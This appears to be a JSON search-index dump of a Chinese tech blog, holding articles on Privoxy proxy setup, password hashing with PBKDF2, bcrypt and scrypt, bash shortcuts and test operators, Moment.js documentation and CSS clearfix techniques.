privoxy.serivce\n\n5.现在你就可以使用http代理了，如果你要给系统设置http代理，就在~/.bashrc里添加一条httpproxy配置。\n\n$ vim ~/.bashrc\n\n添加：\n\nexport httpproxy=http://127.0.0.1:8118/\n\n然后使用source是它立刻生效。\n\n$ source ~/.bashrc","tags":null},{"location":"//blog.pytool.com/Post/前端技术/2016-03-29 账户系统简介","title":"账户系统","text":"如何安全的存储密码\n账户系统介绍\n密码与安全性\n故意增加密码计算所需耗费的资源和时间，使得任何人都不可获得足够的资源建立所需的rainbow table。\n\n　　这类方案有一个特点，算法中都有个因子，用于指明计算密码摘要所需要的资源和时间，也就是计算强度。计算强度越大，攻击者建立rainbow table越困难，以至于不可继续。\n\n　　这类方案的常用算法有三种：\n\n　　1）PBKDF2(Password-Based Key Derivation Function)\n\n　　PBKDF2简单而言就是将salted hash进行多次重复计算，这个次数是可选择的。如果计算一次所需要的时间是1微秒，那么计算1百万次就需要1秒钟。假如攻击一个密码所需的rainbow table有1千万条，建立所对应的rainbow table所需要的时间就是115天。这个代价足以让大部分的攻击者忘而生畏。\n\n　　美国政府机构已经将这个方法标准化，并且用于一些政府和军方的系统。 这个方案最大的优点是标准化，实现容易同时采用了久经考验的SHA算法。\n\n　　2） bcrypt\n\n　　bcrypt是专门为密码存储而设计的算法，基于Blowfish加密算法变形而来，由Niels Provos和David Mazières发表于1999年的USENIX。\n\n　　bcrypt最大的好处是有一个参数（work factor)，可用于调整计算强度，而且work factor是包括在输出的摘要中的。随着攻击者计算能力的提高，使用者可以逐步增大work factor，而且不会影响已有用户的登陆。\n\n　　bcrypt经过了很多安全专家的仔细分析，使用在以安全著称的OpenBSD中，一般认为它比PBKDF2更能承受随着计算能力加强而带来的风险。bcrypt也有广泛的函数库支持，因此我们建议使用这种方式存储密码。\n\n　　3) scrypt\n\n　　scrypt是由著名的FreeBSD黑客 Colin Percival为他的备份服务 Tarsnap开发的。\n\n　　和上述两种方案不同，scrypt不仅计算所需时间长，而且占用的内存也多，使得并行计算多个摘要异常困难，因此利用rainbow table进行暴力攻击更加困难。scrypt没有在生产环境中大规模应用，并且缺乏仔细的审察和广泛的函数库支持。但是，scrypt在算法层面只要没有破绽，它的安全性应该高于PBKDF2和bcrypt。","tags":null},{"location":"//blog.pytool.com/Post/基础/图像处理/2015-12-09 图像处理","title":"图像服务image server","text":"Search · image server","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 bash","title":"Linux命令 bash","text":"---\r\n\r\nLinux 技巧: Bash 测试和比较函数\r\nBash的=~正则表达式匹配\r\n\r\n\r\n\r\n\u003c\u003c\u003c 就是将后面的内容作为前面命令的标准输入\r\ngrep a \u003c\u003c\u003c \"$VARIABLE\" 意思就是在VARIABLE这个变量值里查找字符a\r\n\r\n1. bash 命令行快捷键\r\n\r\nBash命令行的编辑模式：\r\n   （1）有两种：emacs模式、vi 模式。EMACS=Esc+Meta+Alt+Control+Shift，VI=Visual+Interface。\r\n   （2）emacs模式是默认的。\r\n   （3）可以在选项中查看、修改输入模式：命令set -o查看，命令set -o vi/emacs修 改。\r\n\r\nemacs模式的热键操作：\r\n   （1）对于字符（ctrl）：\r\n           前移一个字符：ctrl+f\r\n           后移一个字符：ctrl+b\r\n           删除前一字符：ctrl+h\r\n           删除后一字符：ctrl+d\r\n   （2）对于单词（esc）：\r\n           前移一个单词：esc+f\r\n            后移一个单词：esc+b\r\n            删除前一单词：esc+ctrl+h，或ctrl+w\r\n            删除后一单词：esc+d\r\n            恢复最后删除的项：ctrl+y\r\n    （3）对于行（ctrl）：\r\n           移到行首：ctrl+a\r\n           移到行尾：ctrl+e\r\n           从光标所在删除直到行首：ctrl+u\r\n           从光标所在删除直到行尾：ctrl+k\r\n           移到前一行：ctrl+p\r\n           移到后一行：ctrl+n\r\n    （4）对于历史文件（esc）：\r\n           移动到历史文件的首行：esc+\u003c\r\n           移动到历史文件的末行：esc+  在历史文件中反向搜索：ctrl+r\r\n\r\n命令行补齐：\r\n    （1）通用热键：\r\n           试图补齐命令行：tab\r\n           列出所有可能的备选项：esc+?\r\n    （2）补齐文件名（/）：\r\n           试图补齐文件名：esc+/\r\n           列出所有备选文件名：ctrl+x+/\r\n    （3）补齐用户名（~）：\r\n            试图补齐用户名：esc+~\r\n            列出所有备选用户名：ctrl+x+~\r\n    （4）补齐主机名（@）：\r\n            试图补齐主机名：esc+@\r\n            列出所有备选主机名：ctrl+x+@\r\n    （5）补齐内置变量（$）：\r\n            试图补齐变量名：esc+$\r\n            列出所有备选变量名：ctrl+x+$\r\n    （6）补齐命令名（!）：\r\n            试图补齐命令名：esc+!\r\n            列出所有备选命令名：ctrl+x+!\r\n    （7）补齐历史列表中的命令 名：esc+tab\r\n\r\n杂项命令：\r\n\r\n    （1）清 屏：ctrl+l\r\n    （2）反转光 标所在字符及其前面的字符：ctrl+t\r\n    （3）从光标处开始的整个单词大写：esc+u\r\n    （4）从光标处开始的整个单词小写：esc+l\r\n    （5）将光标处的单词的首字母大写：esc+c\r\n\r\nEmacs风格\r\n\r\nctrl+p: 方向键 上 ↑\r\nctrl+n: 方向键下 ↓\r\nctrl+b: 方向键 ←\r\nalt+f: 光标右移一个单词\r\nctrl+f :方向键 →\r\nalt+b: 光标左移一个单词\r\nctrl+a:光标移到行首\r\nctrl+e:光标移到行尾\r\nctrl+k:清除光标后至行尾的内容。\r\nctrl+d: 删除光标所在字母;注意和backspace以及ctrl+h的区别，这2个是删除光标前的字符\r\nctrl+r:搜索之前打过的命令。会有一个提示，根据你输入的关键字进行搜索bash的history\r\nctrl+m : 输入回车\r\nctrl+i : 输入tab\r\nctrl+[ : 输入esc\r\n\r\nCtrl+U 剪切文本直到行的起始(可以用于清空行)\r\n其它\r\nctrl+h:删除光标前一个字符，同 backspace 键相同。\r\nalt + p 非增量方式反向搜索历史\r\nalt +   历史命令列表中的最后一行命令开始向前\r\nctrl+u: 清除光标前至行首间的所有内容。(可用于复制整行内容)\r\nctrl+w: 移除光标前的一个单词\r\nctrl+t: 交换光标位置前的两个字符\r\nctrl+y: 粘贴或者恢复上次的删除\r\nctrl+l:清屏，相当于clear。\r\nctrl + xx 光标在行头与行尾进行跳转\r\nalt+r 撤销当前行的所有内容\r\nctrl+z : 把当前进程转到后台运行\r\nctrl+s : 锁住屏幕\r\nctrl+q : 恢复屏幕\r\nctrl+v key: 输入特殊字符\r\nalt + l 将当前光标处之后的字母转化成小写字母\r\nalt + u 将当前光标处之后的字母转化成大写字母\r\nctrl + Alt + e 扩展命令行的内容（例如：ls  =  ls  -l  --color=tty）\r\nctrl+c:杀死当前进程, 输入模式下，中断输入的命令。\r\nctrl+d:退出当前 Shell\r\nesc + . 快捷键可以轮询历史命令的参数或选项。\r\nesc + t 快捷键可以 置换前两个单词。\r\n输入重复字母 Esc {100} e 可以输入100个e字符\r\n\r\n按多次{esc}可以补全\r\n{esc}{~}可以补全本机上的用户名\r\n{esc}{/}可以补全文件名\r\n{esc}{@}可以补全主机名,localhost可以方便地用 lo补全.\r\n\r\nBang Bang 历史命令\r\n\r\n!!    重新执行上一条命令\r\n!N  重新执行第N条命令。比如 !3\r\n!-N 重新执行倒数第N条命令。!-3\r\n!string  重新执行以字符串打头的命令。 比如 !vim\r\n!?string?  重新执行包含字符串的命令。 比如 !?test.cpp?\r\n!?string?%  替换为： 最近包含这个字符串的命令的参数。比如：   vim !?test.cpp?%\r\n!$   替换为：上一条命令的最后一个参数。比如 vim !$\r\n!!string  在上一条命令的后面追加 string ，并执行。\r\n!Nstring  在第N条指令后面追加string，并执行。\r\n^old^new^  对上一条指令进行替换\r\n修饰\r\n\r\n:s/old/new/  对第N条指令中第一次出现的new替换为old。 比如 vim !?test.cpp?:s/cpp/c/\r\n:gs/old/new/  全部替换\r\n:wn  w为数字， 取指令的第w个参数.\r\n:p 回显命令而不是执行, 比如 !ls:p  。 这个很有用， 你可以先查看你选的命令对不对，要执行时再使用!!\r\n\r\n##########################################################################\r\n2. bash 配置\r\n PS1：(提示字符的配置)\r\n这是 PS1 (数字的 1 不是英文字母)，这个东西就是我们的『命令提示字符』喔！ 当我们每次按下 [Enter] 按键去运行某个命令后，最后要再次出现提示字符时， 就会主动去读取这个变量值了。上头 PS1 内显示的是一些特殊符号，这些特殊符号可以显示不同的信息， 每个 distributions 的 bash 默认的 PS1 变量内容可能有些许的差异，不要紧，『习惯你自己的习惯』就好了。 你可以用 man bash (注3)去查询一下 PS1 的相关说明，以理解底下的一些符号意义。\r\n\\a                 ASCII 响铃字符（也可以键入 \\007）\r\n \\d                 \"Wed Sep 06\" 格式的日期\r\n\\e                 ASCII 转义字符（也可以键入 \\033）\r\n \\h                 主机名的第一部分（如 \"mybox\"）\r\n\\H                 主机的全称（如 \"mybox.mydomain.com\"）\r\n \\j                 在此shell中通过按 ^Z 挂起的进程数\r\n\\l                 此 shell 的终端设备名（如 \"ttyp4\"）\r\n \\n                 换行符\r\n\\r                 回车符\r\n \\s                 shell 的名称（如 \"bash\"）\r\n\\t                 24 小时制时间（如 \"23:01:01\"）\r\n \\T                 12 小时制时间（如 \"11:01:01\"）\r\n\\@                 带有 am/pm 的 12 小时制时间\r\n \\u                 用户名\r\n\\v                 bash 的版本（如 2.04）\r\n \\V                 Bash 版本（包括补丁级别）\r\n\\w                 当前工作目录（如 \"/home/drobbins\"）\r\n \\W                 当前工作目录的“基名 (basename)”（如 \"drobbins\"）\r\n\\!                 当前命令在历史缓冲区中的位置\r\n \\#                 命令编号（只要您键入内容，它就会在每次提示时累加）\r\n\\$                 如果您不是超级用户 (root)，则插入一个 \"$\"；如果您是超级用户，则显示一个 \"\"\r\n\\xxx               插入一个用三位数 xxx（用零代替未使用的数字，如 \"\\007\"）表示的 ASCII 字符\r\n \\\\                 反斜杠\r\n\\[                 这个序列应该出现在不移动光标的字符序列（如颜色转义序列）之前。它使 bash 能够正确计算自动换行。\r\n \\]                 这个序列应该出现在非打印字符序列之后。\r\nexport PS1=\"\\[\\033]0;\\w\\007\\]\";\r\n\r\n变量默认值设置\r\nUse Default Values: ${parameter-default}, ${parameter:-default}\r\n${parameter-default} -- 如果变量parameter没被声明, 那么就使用默认值.\r\n${parameter:-default} -- 如果变量parameter没被设置, 那么就使用默认值.\r\n注：“（没）被声明”与“（没）被设置”在是否有 “:” 号的句式差别中仅仅是触发点的不同而已。\r\n“被声明”的触发点显然要比“被设置”的要低，\r\n“被设置”是在“被声明”的基础上而且不能赋值（设置）为空（没有赋值/设置为空）。\r\n比如：DIR=${1:-/root}  意思是说，当第一个命令行参数没有或者为空时，默认值为/root。\r\n比如：DIR=${1-/root}  当没有参数时（第一个命令行参数没有声明，当然就是没有参数），默认值为/root。\r\nAssign Default Values: ${parameter=default}, ${parameter:=default}\r\n${parameter=default} -- 如果变量parameter没被声明, 那么就把它的值设为default.\r\n${parameter:=default} -- 如果变量parameter没被设置, 那么就把它的值设为default.\r\n  : 空命令\r\n: ${parameter:=default}\r\n注意前面加上了冒号(:)，即空命令，等同于下面的写法：\r\n[ -z \"$parameter\" ] \u0026\u0026 parameter=default\r\nif [ -z \"$parameter\" ]; then parameter=default; fi\r\n\r\n运算符 \t描述 \t示例\r\n文件比较运算符\r\n-e filename \t如果 filename 存在，则为真 \t[ -e /var/log/syslog ]\r\n-d filename \t如果 filename 为目录，则为真 \t[ -d /tmp/mydir ]\r\n-f filename \t如果 filename 为常规文件，则为真 \t[ -f /usr/bin/grep ]\r\n-L filename \t如果 filename 为符号链接，则为真 \t[ -L /usr/bin/grep ]\r\n-r filename \t如果 filename 可读，则为真 \t[ -r /var/log/syslog ]\r\n-w filename \t如果 filename 可写，则为真 \t[ -w /var/mytmp.txt ]\r\n-x filename \t如果 filename 可执行，则为真 \t[ -L /usr/bin/grep ]\r\nfilename1 -nt filename2 \t如果 filename1 比 filename2 新，则为真 \t[ /tmp/install/etc/services -nt /etc/services ]\r\nfilename1 -ot filename2 \t如果 filename1 比 filename2 旧，则为真 \t[ /boot/bzImage -ot arch/i386/boot/bzImage ]\r\n 字符串比较运算符 （请注意引号的使用，这是防止空格扰乱代码的好方法）\r\n-z string \t如果 string 长度为零，则为真 \t[ -z \"$myvar\" ]\r\n-n string \t如果 string 长度非零，则为真 \t[ -n \"$myvar\" ]\r\nstring1 = string2 \t如果 string1 与 string2 相同，则为真 \t[ \"$myvar\" = \"one two three\" ]\r\nstring1 != string2 \t如果 string1 与 string2 不同，则为真 \t[ \"$myvar\" != \"one two three\" ]\r\n算术比较运算符\r\nnum1 -eq num2 \t等于 \t[ 3 -eq $mynum ]\r\nnum1 -ne num2 \t不等于 \t[ 3 -ne $mynum ]\r\nnum1 -lt num2 \t小于 \t[ 3 -lt $mynum ]\r\nnum1 -le num2 \t小于或等于 \t[ 3 -le $mynum ]\r\nnum1 -gt num2 \t大于 \t[ 3 -gt $mynum ]\r\nnum1 -ge num2 \t大于或等于 \t[ 3 -ge $mynum ]\r\n\r\n\r\n\r\n    3.1     保留变量\r\n\r\n    BASH 中有一些保留变量，下面列出了一些：\r\n\r\n    $IFS　　这个变量中保存了用于分割输入参数的分割字符，默认识空格。\r\n    $HOME 　这个变量中存储了当前用户的根目录路径。\r\n    $PATH 　这个变量中存储了当前 Shell 的默认路径字符串。\r\n    $PS1　　表示第一个系统提示符。\r\n    $PS2　　表示的二个系统提示符。\r\n    $PWD　　表示当前工作路径。\r\n    $EDITOR 表示系统的默认编辑器名称。\r\n    $BASH 　表示当前 Shell 的路径字符串。\r\n    $0, $1, $2, ...\r\n\r\n    $RANDOM    随机数\r\n     特殊参数\r\n    1) $ : 代表所有参数，其间隔为IFS内定参数的第一个字元\r\n    2) $@ : 与星号类同。不同之处在於不参照IFS\r\n    3) $# : 代表参数数量\r\n    4) $? : 执行上一个指令的返回值\r\n    5) $- : 最近执行的foreground pipeline的选项参数\r\n    6) $$ : 本身的Process ID\r\n    7) $! : 执行上一个背景指令的PID\r\n    8) $ : 显示出最後一个执行的命令\r\n\r\n    运算符\r\n    含义（ 满足下面要求时返回 TRUE ）\r\n\r\n  file1 -nt file2   文件 file1 比 file2 更新\r\n  file1 -ot file2   文件 file1 比 file2 更老\r\n  对应的操作\r\n整数操作\r\n\r\n字符串操作\r\n相同          -eq =\r\n不同          -ne !=\r\n大于          -gt   小于          -lt \u003c\r\n大于或等于     -ge\r\n小于或等于     -le\r\n为空          -z\r\n不为空         -n\r\n\r\n1、字符串判断\r\n\r\nstr1 = str2　　　　　　当两个串有相同内容、长度时为真\r\nstr1 != str2　　　　　 当串str1和str2不等时为真\r\n-n str1　　　　　　　 当串的长度大于0时为真(串非空)\r\n-z str1　　　　　　　 当串的长度为0时为真(空串)\r\nstr1　　　　　　　　   当串str1为非空时为真\r\n[ -z STRING ]  “STRING” 的长度为零则为真。\r\n[ -n STRING ] or [ STRING ]  “STRING” 的长度为非零 non-zero则为真。\r\n[ STRING1 == STRING2 ]  如果2个字符串相同。 “=” may be used instead of “==” for strict POSIX compliance则为真。\r\n[ STRING1 != STRING2 ]  如果字符串不相等则为真。\r\n[ STRING1 \u003c STRING2 ]  如果 “STRING1” sorts before “STRING2” lexicographically in the current locale则为真。\r\n[ STRING1   STRING2 ]  如果 “STRING1” sorts after “STRING2” lexicographically in the current locale则为真。  \r\n\r\n 2、数字的判断\r\n\r\nint1 -eq int2　　　　两数相等为真\r\nint1 -ne int2　　　　两数不等为真\r\nint1 -gt int2　　　　int1大于int2为真\r\nint1 -ge int2　　　　int1大于等于int2为真\r\nint1 -lt int2　　　　int1小于int2为真\r\nint1 -le int2　　　　int1小于等于int2为真\r\n\r\n3、文件的判断\r\n-a file   文件 file 存在则为真\r\n-e file   文件 file 已经存在\r\n-s file   文件 file 大小不为零\r\n\r\n-f file   文件 file 是普通文件\r\n-d file   文件 file 是一个目录\r\n-c file　　文件为字符特殊文件为真\r\n-b file　　文件为块特殊文件为真\r\n\r\n-r file   文件 file 对当前用户可以读取\r\n-w file   文件 file 对当前用户可以写入\r\n-x file   文件 file 对当前用户可以执行\r\n\r\n-k FILE ]  如果 FILE 存在且已经设置了粘制位则为真。\r\n\r\n-g file   文件 file 的 GID 标志被设置\r\n-u file   文件 file 的 UID 标志被设置\r\n-O file   文件 file 是属于当前用户的\r\n-G file   文件 file 的组 ID 和当前用户相同\r\n[ -S FILE ]  如果 FILE 存在且是一个套接字则为真。\r\n[ -L FILE ]  如果 FILE 存在且是一个符号连接则为真。\r\n[ -t FD ]  如果文件描述符 FD 打开且指向一个终端则为真。\r\n\r\n[ FILE1 -nt FILE2 ]  如果 FILE1 has been changed more recently than FILE2, or 如果 FILE1 exists and FILE2 does not则为真。\r\n[ FILE1 -ot FILE2 ]  如果 FILE1 比 FILE2 要老, 或者 FILE2 存在且 FILE1 不存在则为真。\r\n[ FILE1 -ef FILE2 ]  如果 FILE1 和 FILE2 指向相同的设备和节点号则为真。\r\n\r\n 4、复杂逻辑判断\r\n\r\n-a 　 　　　　　 与\r\n-o　　　　　　　 或\r\n!　　　　　　　　非\r\n################################################################################\r\nshell编程\r\nDATEPATTERN=\"^[0-9]{4}-[0-9]{1,2}-[0-9]{1,2}$\"\r\nif [[ \"$STARTDATE\" =~ $DATEPATTERN ]] \u0026\u0026 [[ $ENDDATE =~ $DATEPATTERN ]]; then :\r\nelse\r\necho \"date format is invalid!\"\r\nexit;\r\nfi\r\n多条件判断\r\nif [ \"$i\" == \"mysql\" ] || [ \"$i\" == \"informationschema\" ]; then\r\n continue\r\nfi\r\n\r\n一．   bash [  ] 单双括号\r\n\r\n基本要素：\r\n\r\nØ  [ ] 两个符号左右都要有空格分隔\r\n\r\nØ  内部操作符与操作变量之间要有空格：如  [  “a”  =  “b”  ]\r\n\r\nØ  字符串比较中，  需要写成\\ \\\u003c 进行转义\r\n\r\nØ  [ ] 中字符串或者${}变量尽量使用\"\" 双引号扩住，避免值未定义引用而出错的好办法\r\n\r\nØ  [ ] 中可以使用 –a –o 进行逻辑运算\r\n\r\nØ  [ ] 是bash 内置命令：[ is a shell builtin\r\n\r\n1.测试时逻辑操作符\r\n\r\n\r\n\r\n-a\r\n\r\n逻辑与，操作符两边均为真，结果为真，否则为假。\r\n\r\n-o\r\n\r\n逻辑或，操作符两边一边为真，结果为真，否则为假。\r\n\r\n!\r\n\r\n逻辑否，条件为假，结果为真。\r\n\r\n\r\n\r\n举例: [ -w result.txt-a -w score.txt ] ;echo $? // 测试两个文件是否均可写\r\n\r\n\r\n\r\n二．   bash  [[  ]] 双方括号\r\n\r\n\r\n\r\n基本要素：\r\n\r\nØ  [[ ]] 两个符号左右都要有空格分隔\r\n\r\nØ  内部操作符与操作变量之间要有空格：如  [[  “a” =  “b”  ]]\r\n\r\nØ  字符串比较中，可以直接使用   \u003c 无需转义\r\n\r\nØ  [[ ]] 中字符串或者${}变量尽量如未使用\"\" 双引号扩住的话，会进行模式和元字符匹配\r\n\r\n[root@localhostkuohao] [[ \"ab\"=a* ]] \u0026\u0026 echo \"ok\"\r\n\r\n  ok\r\n\r\nØ  [[] ] 内部可以使用 \u0026\u0026  || 进行逻辑运算\r\n\r\nØ  [[ ]] 是bash  keyword：[[ is a shell keyword\r\n\r\n[[ ]] 其他用法都和[ ] 一样\r\n\r\n二者共同特性：\r\n\r\nØ  \u0026\u0026 ||-a –o 处理\r\n\r\n[  exp1  -a exp2  ] = [[  exp1 \u0026\u0026 exp2 ]] = [  exp1  ]\u0026\u0026 [  exp2  ] = [[ exp1  ]] \u0026\u0026 [[  exp2 ]]\r\n\r\n[  exp1  -o exp2  ] = [[  exp1 || exp2 ]] = [  exp1  ]|| [  exp2  ] = [[ exp1  ]] || [[  exp2 ]]\r\n\r\n[root@localhost ~]# if [[ \"a\" == \"a\" \u0026\u0026 2 -gt1 ]] ;then echo \"ok\" ;fi\r\n\r\nok\r\n\r\n[root@localhost ~]# if [[ \"a\" == \"a\" ]] \u0026\u0026 [[2 -gt 1 ]] ;then echo \"ok\" ;fi\r\n\r\nok\r\n\r\n[root@localhost ~]# if [[ \"a\" == \"a\" ]] || [[ 2 -gt 1]] ;then echo \"ok\" ;fi\r\n\r\nok\r\n\r\n[root@localhost ~]# if [[ \"a\" == \"a\" ]] || [[ 2 -gt10 ]] ;then echo \"ok\" ;fi\r\n\r\nok\r\n\r\n[root@localhost ~]# if [[ \"a\" == \"a\"  || 2 -gt 10 ]] ;then echo \"ok\" ;fi\r\n\r\nok\r\n\r\nØ  [[ ]] 和 [ ] 都可以和 ! 配合使用\r\n\r\n优先级 !    \u0026\u0026   ||\r\n\r\n逻辑运算符  \u003c 关系运算符\r\n\r\n逻辑运算符  ： !  \u0026\u0026  || -a  -o\r\n\r\n关系运算符  ：     \\  \\\u003c  ==  = !=  – eq –ne  -gt -ge  –lt  -le","tags":null},{"location":"//blog.pytool.com/Reship/2014-05-07-moment.js-2.6-doc","title":"Moment.js 2.6中文文档","text":"---\n\n文档地址：http://momentjs.com/docs/\n\n1. 在哪使用\n浏览器或者Node.JS\nNode.js\n\n    npm install moment \n\n    var moment = require('moment');\n    moment().format();\n\n浏览器\n\n    script src=\"moment.js\"/script\n    script\n        moment().format();\n    /script\n\nBower\n\n    bower install --save momentjs\n\n2. Parse\n 2.1 Now\n想要得到当前日期和时间，只需调用 moment() ，无需参数\n\n    var now = moment()\n2.2 通过时间字符串创建\n\n    moment(string)\n所有浏览器都支持ISO-8601 时间格式\n\n    \"2013-02-08\"\n    \"2013-02-08T09\"\n    \"2013-02-08 09\"\n    \"2013-02-08T09:30\"\n    \"2013-02-08 09:30\"\n    \"2013-02-08T09:30:26\"\n    \"2013-02-08 09:30:26\"\n    \"2013-02-08T09:30:26.123\"\n    \"2013-02-08 09:30:26.123\"\n    \"2013-02-08T09:30:26 Z\"\n    \"2013-02-08 09:30:26 Z\"\n    \"2013-W06-5\"\n    \"2013-W06-5T09\"\n    \"2013-W06-5 09\"\n    \"2013-W06-5T09:30\"\n    \"2013-W06-5 09:30\"\n    \"2013-W06-5T09:30:26\"\n    \"2013-W06-5 09:30:26\"\n    \"2013-W06-5T09:30:26.123\"\n    \"2013-W06-5 09:30:26.123\"\n    \"2013-W06-5T09:30:26 Z\"\n    \"2013-W06-5 09:30:26 Z\"\n    \"2013-039\"\n    \"2013-039T09\"\n    \"2013-039 09\"\n    \"2013-039T09:30\"\n    \"2013-039 09:30\"\n    \"2013-039T09:30:26\"\n    \"2013-039 09:30:26\"\n    \"2013-039T09:30:26.123\"\n    \"2013-039 09:30:26.123\"\n    \"2013-039T09:30:26 Z\"\n    \"2013-039 09:30:26 Z\"\n\n如果字符串参数不能匹配任何一种格式，并且不能被Date.parse转换，那么momentisValid返回false\n\n    moment('not a real date').isValid(); //false\n\n2.3 通过字符串+格式创建\n\n    moment(String, String);\n    moment(String, String, String);\n    moment(String, String, Boolean);\n    moment(String, String, String, Boolean);\n\n 2.4 通过字符串数组+格式创建\n\n    moment(String, String[], String, Boolean);\n\n2.5 通过对象创建\n    \n    moment({unit: value, ...});\n\n例如：\n\n    moment({hour: 15, minute: 10});\n    moment({y: 2010, M: 3, d: 5, h: 15, m: 10, s: 3, ms: 123});\n    moment({year: 2010, month: 3, day: 5, hour: 15, minute: 10, second: 3, millisecond: 123});\n    moment({years: 2010, months: 3, days: 5, hours: 15, minutes: 10, seconds: 3, milliseconds: 123});\n\n 2.6 通过 Unix Offset(miliseconds)创建\n\n    moment(Number);\n\n例如：\n\n    var day =moment(1318781876406);\n\n2.7 通过Unix Timestamp(seconds)创建\n\n    moment.unix(Number)\n\n例如：\n\n    var day = moment.unix(1318781876);\n 2.7 通过Date 对象创建\n2.8 通过数组创建\n 2.9 通过Asp.net JSON Date 创建\n3 Moment Clone\n\n    moment(Moment);\n    或者momentclone\n\n4 UTC\n默认情况下，moment以本地时间来显示和转换时间\n如果你想以UTC来转换或显示时间，你可以使用moment.utc()\n\n    moment.utc();\n    moment.utc(Number);\n    moment.utc(Number[]);\n    moment.utc(String);\n    moment.utc(String, String);\n    moment.utc(String, String[]);\n    moment.utc(String, String, String);\n    moment.utc(Moment);\n    moment.utc(Date);\n\n 5 parseZone\n\n    moment.parseZone(String)\n6 验证\n\n    moment().isValid();\n 7 默认时间\n    \n    moment(\"15\", \"hh\")\n\n你可以仅指定某些时间单位来创建一个moment对象，未指定的单位则取当前日期默认值，时间为0\n\n8 Get+Set\n没有参数调用为getter,有参数调用为setter\n为了方便起见，单数和复数形式的函数名均存在\n 8.1 Millisecond\n\n    moment().millisecond(Number);\n    moment().millisecond(); // Number\n    moment().milliseconds(Number);\n    moment().milliseconds(); // Number\n\n接受参数范围0--999，如果超出，将会增加seconds\n8.2 Second\n\n    moment().second(Number);\n    moment().second(); // Number\n    moment().seconds(Number);\n    moment().seconds(); // Number\n\n接受参数范围0--59，如果超出，将会增加minutes\n\n 8.3 Minute\n\n    moment().minute(Number);\n    moment().minute(); // Number\n    moment().minutes(Number);\n    moment().minutes(); // Number\n\n接受参数范围0--59，如果超出，将会增加hours\n\n8.4 Hour\n\n    moment().hour(Number);\n    moment().hour(); // Number\n    moment().hours(Number);\n    moment().hours(); // Number\n\n接受参数范围0--23，如果超出，将会增加day\n\n 8.5 Date of Month \n\n    moment().date(Number);\n    moment().date(); // Number\n    moment().dates(Number);\n    moment().dates(); // Number\n\n参数接受范围1--31，如果超出，将会增加months\n注意：Moment#date 用来设置date of month，而Moment#day 用来设置day of week\n8.6 Day of week\n\n    moment().day(Number|String);\n    moment().day(); // Number\n    moment().days(Number|String);\n    moment().days(); // Number\n\nSunday as 0 and Saturday as 6.如果超出，则变到下一周\n也可以使用 week name,例如：\n\n    moment().day(\"Sunday\");\n    moment().day(\"Monday\");\n\n 8.7 Day of Week (Locale Aware) \n\n    moment().weekday(Number);\n    moment().weekday(); // Number\n根据区域设置gets或者sets day of week\n8.9 ISO Day of Week \n\n    moment().isoWeekday(Number);\n    moment().isoWeekday(); // Number\n\nGets or sets the ISO day of the week with 1 being Monday and 7 being Sunday.\n\n 8.10 Day of Year \n\n    moment().dayOfYear(Number);\n    moment().dayOfYear(); // Number\n\n接收参数范围 1--366，如果超出，则进入下一年\n8.11 Week of Year\n\n    moment().week(Number);\n    moment().week(); // Number\n    moment().weeks(Number);\n    moment().weeks(); // Number\n\n 8.12 Week of Year (ISO) \n\n    moment().isoWeek(Number);\n    moment().isoWeek(); // Number\n    moment().isoWeeks(Number);\n    moment().isoWeeks(); // Number\n\n当设置week of year 时，day of week 将被保留\n\n8.13 Month \n\n    moment().month(Number|String);\n    moment().month(); // Number\n    moment().months(Number|String);\n    moment().months(); // Number\n参数接受范围0--11,如果超出，会进入下一年。\n注意：月份是zero indexed,即 一月是0\n同样支持month name,例如：\n\n    moment().month(\"January\");\n    moment().month(\"Feb\");\n\n 8.14 Quarter\n\n    moment().quarter(); // Number\n    moment().quarter(Number);\n参数接受范围1--4\n\n8.15 Year\n\n    moment().year(Number);\n    moment().year(); // Number\n    moment().years(Number);\n    moment().years(); // Number\n\n接受参数范围-270,000","tags":null},{"location":"//blog.pytool.com/Post/前端技术/CSS十日谈/2013-12-16-the-fourth-day-talk-about-clearfix-part-two","title":"第四天，谈谈【清除浮动 (下)】","text":"在上一篇：清除浮动 (上)中我们提到了两种清除浮动的方式：\n\n 方法一：直接在HTML中插入带有 clear 属性的标签\n 方法二：使用 :after 伪类和 content 属性，用CSS插入清除浮动的元素\n\n后来有人发现了更简单的方式，仅仅使用 overflow 属性就可以。先看效果：\niframe width=\"100%\" height=\"300\" src=\"http://jsfiddle.net/zicai/z5a34/7/embedded/\" allowfullscreen=\"allowfullscreen\" frameborder=\"0\"/iframe\noverflow 属性规定当内容溢出容器框时应该怎样。在默认情况下，内容会溢出到容器之外，进入相邻的空间。当 overflow 的属性值为 hidden 、auto 或 scroll 时有一个有用的副作用，就是它会自动清理包含的任何浮动元素。\n\noverflow  这一副作用在大多数浏览器都有效，但是对于IE6、7我们仍需利用其 auto-enclosing（上一篇有介绍），即需要触发容器的hasLayout。（注意：overflow 在IE7中可以触发hasLayout，在IE6中不可以）\n\n所以第三种清除浮动的方法如下：\n\n    .container {\n        /省略其它样式/\n    \toverflow: hidden; /为什么不用auto?，见下面说明/\n    \twidth: 100%; /用于触发IE6下 hasLayout 。也可以使用其它可以触发hasLayout的属性/\n    }\n\n需要注意的是：\n\n 对于opera浏览器则必须指定容器的width或者height。\n 对于Mac上的IE浏览器则必须使用overflow:hidden ，因为overflow:auto\n    也会像overflow:scroll一样，总是产生滚动条。\n\n但是这种方法也并不完美，先看效果：\niframe width=\"100%\" height=\"300\" src=\"http://jsfiddle.net/zicai/z5a34/8/embedded/\" allowfullscreen=\"allowfullscreen\" frameborder=\"0\"/iframe\n我在内容里放置了一个相对定位的正方形，并试图将其定位到容器之外，结果它被切掉了一部分，因为该方法用到了overflow:hidden。\n（当然，如果你的设计稿没有这种布局效果的话，那么是可以使用第三种方法的。）\n\n再后来，有人改进了第二种清除浮动的方法，得到如下方法：\n\n    .clearfix:before,\n    .clearfix:after {\n        content: \" \";\n        display: table;\n    }\n    .clearfix:after {\n        clear: both;\n    }\n    .clearfix {\n        zoom: 1;/For IE 6/7 触发hasLayout/\n    }\n\n这种方法被称作micro clearfix，目前bootstrap 就采用这种方式清除浮动。\n\n该方法使用content:\" \"代替了方法二中的content:\".\"，这样就没必要用height: 0 和visibility: hidden来隐藏生成的内容了（不仅减少了CSS代码量，而且避免了Opera一个奇特的bug）。同方法二相同，使用:after伪类插入内容用于清除浮动。与之不同的是，使用:before伪类并且将生成的内容display: table是为了防止 top-margin 折叠。这样做的好处以及top-margin* 